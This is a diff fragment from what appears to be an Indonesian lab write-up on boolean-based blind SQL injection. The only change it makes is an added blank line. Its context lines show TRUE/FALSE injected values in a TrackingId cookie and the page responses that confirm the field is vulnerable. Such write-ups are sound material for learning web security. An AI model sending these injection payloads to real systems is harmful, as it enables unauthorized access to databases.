@@ -26,6 +26,7 @@ Uji respons aplikasi dengan menyuntikkan kondisi logika TRUE dan FALSE pada Trac
 
 * **Kondisi TRUE:** `TrackingId=G46zfqQCFRHwIFHu' AND '1'='1 -> Respons: Teks "Welcome back!" muncul.`
 * **Kondisi FALSE:** `TrackingId=G46zfqQCFRHwIFHu' AND '1'='2 -> Respons: Teks "Welcome back!" hilang.`
+
 Ini mengonfirmasi bahwa parameter TrackingId rentan terhadap Boolean-Based Blind SQLi.
 
 ### Memverifikasi Keberadaan User 'administrator'
